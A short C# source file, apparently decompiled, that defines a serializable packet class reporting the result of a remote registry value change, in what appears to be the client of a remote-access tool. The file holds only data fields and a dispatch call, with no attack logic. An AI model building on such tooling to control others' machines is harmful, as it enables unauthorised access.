using System;
using xClient.Core.Registry;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetChangeRegistryValueResponse : GInterface4
{
	public string KeyPath { get; set; }

	public RegValueData Value { get; set; }

	public bool IsError { get; set; }

	public string ErrorMsg { get; set; }

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
